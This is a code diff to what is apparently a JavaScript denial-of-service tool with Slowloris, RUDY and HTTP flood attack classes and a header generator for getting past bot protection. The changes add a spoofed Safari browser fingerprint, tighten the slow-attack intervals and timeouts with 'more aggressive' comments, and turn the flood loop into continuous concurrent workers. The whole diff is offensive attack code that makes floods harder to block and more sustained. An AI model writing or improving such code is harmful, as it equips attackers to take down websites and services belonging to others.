@@ -71,6 +71,11 @@ class BypassGenerator {
                 ua: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
                 ch: '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
                 platform: '"Linux"'
+            },
+            {
+                ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
+                ch: null, // Safari doesn't send sec-ch-ua
+                platform: '"macOS"'
             }
         ];
         this.acceptLanguages = ['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'de-DE,de;q=0.9,en;q=0.8', 'es-ES,es;q=0.9,en;q=0.8', 'fr-FR,fr;q=0.9,en;q=0.8'];
@@ -177,7 +182,7 @@ class RudyAttack {
         };
 
         const scheduleNextByte = () => {
-            const randomInterval = 8000 + Math.random() * 4000;
+            const randomInterval = 7000 + Math.random() * 3000; // More aggressive keep-alive
             timeoutId = setTimeout(() => {
                 sendSlowByte();
                 scheduleNextByte();
@@ -262,7 +267,7 @@ class SlowlorisAttack {
                 this.stats.failed++;
                 clearInterval(intervalId);
             }
-        }, 10000 + Math.random() * 5000); // Send a header every 10-15 seconds
+        }, 8000 + Math.random() * 4000); // More aggressive keep-alive
 
         return { req, intervalId };
     }
@@ -289,7 +294,6 @@ class L7Flood {
         this.threadCount = threadCount;
         this.delay = delay;
         this.stats = stats;
-        this._running = false;
         this.bypasser = bypasser;
         try {
             this.url = new URL(targetUrl);
@@ -310,7 +314,7 @@ class L7Flood {
             method: method,
             headers: headers,
             http2: true,
-            timeout: { request: 5000 },
+            timeout: { request: 4000 }, // Aggressive timeout
             retry: { limit: 0 },
             throwHttpErrors: false,
         };
@@ -329,18 +333,24 @@ class L7Flood {
         }
     }
 
-    start() {
-        this.floodInterval = setInterval(() => {
-            for (let i = 0; i < this.threadCount; i++) {
-                this.sendRequest(); // Fire and forget
-            }
-        }, this.delay);
+    async runWorker() {
+        while (this.running) {
+            await this.sendRequest();
+        }
+    }
+
+    async start() {
+        this.running = true;
+        const workers = [];
+        for (let i = 0; i < this.threadCount; i++) {
+            workers.push(this.runWorker());
+        }
+        // This will run until stop() is called
+        await Promise.all(workers);
     }
 
     stop() {
-        if (this.floodInterval) {
-            clearInterval(this.floodInterval);
-        }
+        this.running = false;
     }
 }
 
@@ -362,7 +372,7 @@ class NuclearFlood extends L7Flood {
             headers: headers,
             body: requestBody,
             http2: true,
-            timeout: { request: 5000 },
+            timeout: { request: 4000 }, // Aggressive timeout
             retry: { limit: 0 },
             throwHttpErrors: false,
         };
